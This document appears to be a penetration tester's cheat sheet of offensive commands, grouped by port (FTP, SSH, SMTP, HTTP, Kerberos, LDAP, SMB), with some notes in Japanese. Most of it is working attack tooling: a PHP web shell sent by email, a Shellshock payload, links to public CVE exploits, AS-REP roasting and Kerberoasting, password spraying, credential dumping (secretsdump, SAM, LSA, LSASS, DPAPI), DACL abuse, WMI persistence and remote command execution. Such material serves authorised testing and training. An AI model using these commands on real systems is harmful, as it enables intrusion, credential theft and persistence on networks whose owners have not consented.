## 0
- `rustsvan -a 'IP' --no-banner --scripts none`
- `nmap -n -Pn -p- -sV 'IP'`
- `nmap -n -Pn -sV --script vuln 'IP'`


## 21
- curl
```sh
# upload
curl -s -T 'FILE' --user 'USERNAME:PASSWORD' ftp://'IP'
```
- nmap
```sh
# anonymous login
nmap -n -Pn -p21 -sV --script=ftp-anon 'IP'
```
- tnftp
```sh
# anonymous login
tnftp -a 'IP'
```


## 22
- scp
```sh
# download
scp 'USERNAME'@'IP':'FILEPATH' 'LOCALPATH'
```
- ssh
```sh
chmod 600 'SECRETKEY'
ssh -i 'SECRETKEY' 'USERNAME@IP'
# Local Port Forwarding
ssh -L 'LISTENPORT':'FORARD_IP':'FORWARD_PORT' 'USERNAME'@'SSH_SERVER_IP'
```


## 25
- swaks
```sh
# send webshell
swaks -f 'FROM_USERNAME@DOMAIN' -t 'TO_USERNAME@DOMAIN' -d '<?php system($_REQUEST["cmd"]); ?>' -s 'IP'
```


## 80
- cadaver
```sh
# connect to webdav
cadaver 'URL'
```
- curl
```sh
curl -I 'URL'
curl -X OPTIONS -I 'URL'
curl -ks 'URL'
```
- davtest
```sh
# test webdav
davtest -url 'URL' -cleanup
```
- ffuf
```sh
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -u 'URL'/FUZZ/
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u 'URL'/FUZZ
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://'URL'/FUZZ -e .sh
```
- nmap
```sh
nmap -n -Pn -p80 -sV --script=http-methods 'IP'
nmap -n -Pn -p80 -sV --script=http-default-account 'IP'
```
- exploit
  - shellshock
    ```sh
    nmap -n -Pn -p80 --script=http-shellshock --script-args uri=/cgi-bin/user.sh 'IP'
    # CVE-2014-6271
    curl -A "() { :;}; COMMAND" 'URL'
    ```
    https://github.com/mubix/shellshocker-pocs?tab=readme-ov-file#command-line-linux-osx-and-windows-via-cygwin
  - [PHP 8.1.0-dev](https://www.exploit-db.com/exploits/49933)
  - [Maltrail](https://github.com/spookier/Maltrail-v0.53-Exploit?tab=readme-ov-file)
  - CVE-2012-4869 - FreePBX
  - [CVE-2014-6287](https://www.exploit-db.com/exploits/49584) - Http File Server
  - [CVE-2015-6967](https://github.com/dix0nym/CVE-2015-6967) - NibbleBlog
  - [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/) - Windows Server 2003 R2 IIS6.0 webdav
  - [CVE-2018-9276](https://github.com/A1vinSmith/CVE-2018-9276) - PRTG Network Monito
  - [CVE-2019-25065](https://www.exploit-db.com/exploits/47691) - OpenNetAdmin
  - [CVE-2022-25765](https://github.com/nikn0laty/PDFkit-CMD-Injection-CVE-2022-25765) - PDFkit
  - [CVE-2023-27163](https://github.com/entr0pie/CVE-2023-27163) - request-baskets


## 88
- impacket-GetNPUsers
```sh
# userenum & asreproast
impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -usersfile 'USERLIST' 'DOMAIN'
impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -no-pass 'DOMAIN/USERNAME'
```
- impacket-GetUserSPNs
```sh
# kerberoasting (TCP389番も必要)
impacket-GetUserSPNs -outputfile 'FILE' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
```
- kerbrute
```sh
# userenum
./kerbrute_linux_amd64 userenum --dc 'IP' -d 'DOMAIN' 'USERLIST'
```
- netexec
```sh
# ASREPRoast (TCP389番も必要)
netexec ldap 'IP' -u 'USERLIST' -p '' --asreproast 'FILE'
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --asreproast 'FILE'
# Kerberoasting (TCP389番も必要)
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --kdcHost 'IP' --kerberoasting 'FILE'
```


## 123 (UDP)
- ntpdate
```sh
# sync date
sudo ntpdate 'IP'
```


## 135
https://github.com/XiaoliChan/wmiexec-Pro
- impacket-getArch
```sh
impacket-getArch -target 'IP'
```


## 389
- godap
```sh
./godap 'IP' -u 'USERNAME' -p 'PASSWORD'
```
- impacket-changepasswd
- impacket-findDelegation
```sh
impacket-findDelegation -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
```
- impacket-GetADComputers
```sh
impacket-GetADComputers -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
```
- impacket-GetADUssers
```sh
impacket-GetADUssers -all -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
```
- impacket-dacledit
```sh
# write
impacket-dacledit -ts -dc-ip 'IP' -principal-dn 'DN' -target-dn 'DN' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
impacket-dacledit -ts -dc-ip 'IP' -principal-sid 'SID' -target-sid 'SID' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target 'SAMACCOUNTNAME' -action write -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
# read
impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action read -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
# remove
impacket-dacledit -ts -dc-ip 'IP' -principal 'SAMACCOUNTNAME' -target-dn 'DN' -action remove -rights 'FullControl or ResetPassword or WriteMembers or DCSync' -ace-type 'allowed or denied' 'DOMAIN/USERNAME:PASSWORD'
```
- impacket-owneredit
```sh
# write
impacket-owneredit -ts -dc-ip 'IP' -new-owner-dn 'DN' -target-dn 'DN' -action write 'DOMAIN/USERNAME:PASSWORD'
impacket-owneredit -ts -dc-ip 'IP' -new-owner-sid 'SID' -target-sid 'SID' -action write 'DOMAIN/USERNAME:PASSWORD'
impacket-owneredit -ts -dc-ip 'IP' -new-owner 'SAMACCOUNTNAME' -target 'SAMACCOUNTNAME' -action write 'DOMAIN/USERNAME:PASSWORD'
# read
impacket-owneredit -ts -dc-ip 'IP' -target-dn 'DN' -action read 'DOMAIN/USERNAME:PASSWORD'
```
- ldapdomaindump
```sh
ldapdomaindump -u 'DOMAIN\USERNAME' -p 'PASSWORD' -at NTLM --no-json --no-grep ldap://'IP'
```
- ldapnomnom
```sh
# LDAP Ping
./ldapnomnom -input 'USERLIST' -parallel 'THREAD NUMBER' -server 'IP'
# rootDSE
./ldapnomnom -server 'IP' -dump
```
- LdapRelayScan
- ldapsearch
```sh
ldapsearch -b 'DN' -LLL -s 'sub' -D 'USERNAME@DOMAIN' -H ldap://'IP' -w 'PASSWORD' 'FILTER' 'ATTRIBUTES'
```
- ldeep
```sh
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users all
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users spn
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users enabled
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users disabled
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users locked
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users nopasswordexpire
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users passwordexpired
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users passwordnotrequired
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users nokrbpreauth
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' users reversible
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' whoami
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' enum_users 'USERLIST'
# https://learn.microsoft.com/ja-jp/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties#list-of-property-flags
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' change_uac 'USERNAME(DN format)' 'VALUE'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' groups
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' memberships 'USERNAME'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' membersof 'GROUPNAME'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' add_to_group 'USERNAME(DN format)' 'GROUPNAME(DN format)'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' remove_to_group 'USERNAME(DN format)' 'GROUPNAME(DN format)'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' create_user 'USERNAME' 'PASSWORD'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' modify_password 'USERNAME' 'PASSWORD'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' create_computer 'COMPUTERNAME' 'PASSWORD'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' search '(FILTER)' ['ATTRIBUTES']
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' conf
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' schema
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' server_info
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' dns_records
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' zones
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' zone 'DNS'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' trusts
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' pkis
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' gpo
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' domain_policy
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' object 'OBJECT'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' sddl 'OBJECT'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' from_guid 'GUID'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' from_sid 'SID'
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' ou
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' machines
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' computers
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' delegations all
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' laps
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' auth_policies
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' bitlockerkeys
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' fsmo
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' gmsa
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' pso
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' sccm
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' shadow_principals
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' silos
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' silo all
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' smsa
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' subnets
ldeep ldap -d 'DOMAIN' -s 'IP' -t ntlm -u 'USERNAME' -p 'PASSWORD' tempaltes
```
- msldap
- net ads
```sh
net ads info -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# user
net ads user -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net ads user add 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net ads user delete 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# group
net ads group add 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net ads group delete 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# printer
net ads printer search -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# search
net ads search 'EXPRESSION' 'ATTRIBUTES' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# dn
net ads search 'DISTINGUISHEDNAME' 'ATTRIBUTES' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# sid
net ads search 'SID' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# workgroup
net ads workgroup -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# lookup
net ads lookup -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
```
- netexec
```sh
# Authentication
netexec ldap 'IP' -u 'USERNAMELIST' -p '' -k
# Enumerate Domain Users
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export 'FILE'
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --active-users
# Enumerate Domain Groups
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --groups
# Find Domain SID
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --get-sid
# Admin Count
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --admin-count
# Machine Account Quota
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M maq
# Get User Descriptions
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M get-desc-users
# Read DACL Rights
https://www.netexec.wiki/ldap-protocol/read-dacl-right
# List DC IP / Enum Trust
netexec ldap 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dc-list
# Bloodhound Ingestor
netexec ldap 'IP' --dns-server 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --bloodhound --collection All
```
- silenthound
```sh
python3.13 silenthound.py -u 'USERNAME' -p 'PASSWORD' -g -n -k --kerberoast 'IP' 'DOMAIN'
```
- windapsearch
```sh
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m metadata
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m gpos
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m computers
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m admin-objects
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m groups
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m members -g 'GROUPNAME(DN)' -r
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m members -s 'KEYWORD'
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m users
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m domain-admins
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m privileged-users
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m unconstrained
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m user-spns
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m search -s 'KEYWORD' --attrs 'ATTRIBUTES'
./windapsearch-linux-amd64 --dc 'IP' -u 'USERNAME@DOMAIN' -p 'PASSWORD' -m custom --filter 'FILTER' --attrs 'ATTRIBUTES'
```


## 443
- nmap
```sh
# heartbleed
nmap -n -Pn -p443 --script=ssl-heartbleed 'IP'
```
- sslscan
```sh
sslscan --no-check-certificate --no-ciphersuites --no-compression --no-fallback --no-groups --no-heartbleed --no-renegotiation 'IP'
```
- CVE
  - [heartbleed](https://github.com/sensepost/heartbleed-poc)


## 445 (139を使うことも)
(msrpcはTCP135番やDynamicPortも使う)
- donpapi
```sh
donpapi
```
- hekatomb
```sh
# DPAPI blob (TCP53番とTCP389番も使用)
hekatomb 'DOMAIN/USERNAME:PASSWORD@IP'
```
- enum4linux
```sh
# enum4linux-ng のほうが２倍はやい
enum4linux -a -d -u 'USERNAME' -p 'PASSWORD' -w 'DOMAIN' -v 'IP'
```
- enum4linux-ng
```sh
enum4linux-ng -A -Gm -C -u 'USERNAME' -p 'PASSWORD' -d -t 'TIMEOUT' 'IP'
```
- impacket-DumpNTLMInfo
```sh
impacket-DumpNTLMInfo 'IP'
```
- impacket-Get-GPPPassword
```sh
# MS14-025
impacket-Get-GPPPassword -share 'SHARENAME' -ts 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-Get-GPPPassword -share 'SHARENAME' -base-dir 'PATH' -ts 'DOMAIN/USERNAME:PASSWORD@IP'
```
- impacket-lookupsid
```sh
impacket-lookupsid -ts 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-lookupsid -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'MAX RID'
```
- impacket-machine_role
```sh
impacket-machine_role -ts 'DOMAIN/USERNAME:PASSWORD@IP'
```
- impacket-net
```sh
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user -name 'USERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user -create 'USERNAME' -newPasswd 'PASSWORD'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user -remove 'USERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user -enable 'USERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' user -disable 'USERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' computer
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' computer -name 'COMPUTERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' computer -create 'COMPUTERNAME' -newPasswd 'PASSWORD'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' computer -remove 'COMPUTERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' computer -enable 'COMPUTERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' computer -disable 'COMPUTERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' localgroup
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' localgroup -name 'GROUPNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' localgroup -name 'GROUPNAME' -join 'USERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' localgroup -name 'GROUPNAME' -unjoin 'USERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME' -join 'USERNAME'
impacket-net 'DOMAIN/USERNAME:PASSWORD@IP' group -name 'GROUPNAME' -unjoin 'USERNAME'
```
- impacket-netview
```sh
# track of who logged in or 
impacket-netview -target 'IP' -delay 'SECOND' -ts 'DOMAIN/USERNAME:PASSWORD'
```
- impacket-reg
```sh
impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' query -keyName 'KEYNAME'
impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' query -keyName 'KEYNAME' -v 'VALUENAME'
impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' query -keyName 'KEYNAME' -s
# VALUETYPE are: REG_NONE, REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_DWORD_BIG_ENDIAN, REG_LINK, REG_MULTI_SZ, REG_QWORD
impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' add -keyName 'KEYNAME' -v 'VALUENAME' -vt 'VALUETYPE' -vd 'VALUEDATA'
impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' delete -keyName 'KEYNAME' -v 'VALUENAME'
impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' save -keyName 'KEYNAME' -o '\\IP\SHARE'
impacket-reg 'DOMAIN/USERNAME:PASSWORD@IP' bakcup -keyName 'KEYNAME' -o '\\IP\SHARE'
```
- impacket-rpcdump
```sh
impacket-rpcdump 'DOMAIN/USERNAME:PASSWORD@IP'
```
- impacket-rpcmap
```sh
impacket-rpcmap ncacn_ip_tcp:'IP'
impacket-rpcmap ncacn_http:'IP'
```
- impacket-samrdump
```sh
impacket-samrdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
```
- impacket-secretsdump
```sh
# dumping NTLM hashs and Kerberos Keys
impacket-secretsdump -ts 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-secretsdump -ts -just-dc-user 'USERNAME' -just-dc-ntlm 'DOMAIN/USERNAME:PASSWORD@IP'
```
- impacket-services
```sh
impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' list
impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' status -name 'SERVICENAME'
impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' start -name 'SERVICENAME'
impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' stop -name 'SERVICENAME'
impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' config -name 'SERVICENAME'
impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' create -name 'SERVICENAME' -display 'DISPLAYNAME' -path 'FILEPATH'
impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' change -name 'SERVICENAME' -display 'DISPLAYNAME' -service_type '1 OR 2 OR 4 OR 8 OR 16 OR 32 OR 256' -start_type '0 ~ 5'
impacket-services 'DOMAIN/USERNAME:PASSWORD@IP' delete -name 'SERVICENAME'
```
- impacket-smbclient
```
impacket-smbclient -no-pass ' '@'IP' # guest
impacket-smbclient 'DOMAIN/USERNAME:PASSWORD@IP'
# shares
# use 'SHARE'
# tree
# cd 'REMOTEPATH'
# cat 'REMOTEPATH'
# get 'REMOTEPATH'
# info
# who
```
- impacket-wmipersist
```sh
impacket-wmipersist 'DOMAIN/USERNAME:PASSWORD@IP' install -name 'NAME' -command "COMMAND"
```
- impacket-wmiquery
```sh
impacket-wmiquery 'DOMAIN/USERNAME:PASSWORD@IP'
WQL>
```
- impacket-psexec
```sh
# exec
impacket-psexec  -ts 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-smbexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-wmiexec -share 'SHARENAME' -ts -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-dcomexec -share 'SHARENAME' -ts -object 'ShellWindows or ShellBrowserWindow or MMC20' -shell-type 'CMD or POWERSHELL' 'DOMAIN/USERNAME:PASSWORD@IP'
impacket-atexec -ts 'DOMAIN/USERNAME:PASSWORD@IP' 'COMMAND'
```
- netexec
```sh
# guest
netexec smb 'IP' -u ' ' -p ''
# Password Spraying
netexec smb 'IP' -u 'USERNAMELIST' -p 'PASSWORDLIST'
# NTHASH
netexec smb 'IP' -u 'DOMAIN\USERNAME' -H 'NTHASH'
# Spidering Shares
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' -M spider_plus
# Get and Put Files
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --get-file 'REMOTEPATH' 'LOCALPATH'
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --share 'SHARENAME' --put-file 'LOCALPATH' 'REMOTEPATH'
# Enumeration
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --interfaces
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --disks
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --shares
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --pass-pol
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --rid-brute
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --local-group
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --users-export 'OUTPUT.txt'
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --loggedon-users
# Obtaining Credentials
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --sam
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --lsa
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --dpapi
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M ntdsutil
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M lsassy
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M reg-winlogon
and so on ...
# Checking for Spooler & WebDav
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M spooler
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' -M webdav
# RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --delegate 'ADMINISTRAOR'
# S4U2Self
netexec smb 'IP' -u 'COMPUTERACCOUNT$' -H 'NTHASH' --delegate 'ADMINISTRAOR' --self
# exec
netexec smb 'IP' --share 'SHARENAME' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'smbexec' -x 'COMMAND'
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'wmiexec' -x 'COMMAND'
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'mmcexec' -x 'COMMAND'
netexec smb 'IP' -u 'DOMAIN\USERNAME' -p 'PASSWORD' --exec-method 'atexec' -x 'COMMAND'
```
- net rpc
```sh
net rpc info -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# user
net rpc user -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc user info 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc user add 'USERNAME' 'PASSWORD' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc user password 'USERNAME' 'PASSWORD' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc user rename 'OLD_USERNAME' 'NEW_USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc user delete 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# group
net rpc group list global -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc group list local -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc group list builtin -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc group add 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc group rename 'OLD_GROUPNAME' 'NEW_GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc group delete 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc group members 'GROUPNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc group addmem 'GROUPNAME' 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
net rpc group delmem 'GROUPNAME' 'USERNAME' -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
# share
net rpc share -U 'DOMAIN/USERNAME%PASSWORD' -S 'IP'
